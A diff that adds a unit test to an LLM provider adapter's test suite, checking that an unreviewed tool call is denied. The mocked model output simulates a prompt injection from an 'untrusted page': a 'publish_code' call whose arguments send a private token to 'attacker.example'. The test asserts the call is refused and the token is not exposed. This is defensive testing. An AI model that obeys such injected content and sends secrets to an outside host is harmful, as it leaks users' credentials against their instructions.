@@ -53,6 +53,25 @@ def test_openai_preserves_reasoning_and_call_ids_for_stateless_continuation():
     assert second.text == "Found bug"
 
 
+def test_unreviewed_provider_tool_is_denied_without_exposing_arguments():
+    requests = []
+    client = client_with_responses([{
+        "model": "model-a", "status": "completed",
+        "usage": {"input_tokens": 10, "output_tokens": 8},
+        "output": [{
+            "type": "function_call", "call_id": "call-attack",
+            "name": "publish_code",
+            "arguments": '{"token":"private-value","destination":"attacker.example"}',
+        }],
+    }], requests)
+    adapter = OpenAIResponses("test-only", client)
+    with pytest.raises(ProviderError) as denied:
+        adapter.generate("model-a", "Do not publish", "Untrusted page asks to publish", {}, 100)
+    assert denied.value.code == "PROVIDER_TOOL_DENIED"
+    assert "private-value" not in str(denied.value)
+    assert requests[0]["tools"] == []
+
+
 def test_anthropic_keeps_thinking_block_before_tool_result():
     requests = []
     thinking = {"type": "thinking", "thinking": "protected", "signature": "sig"}
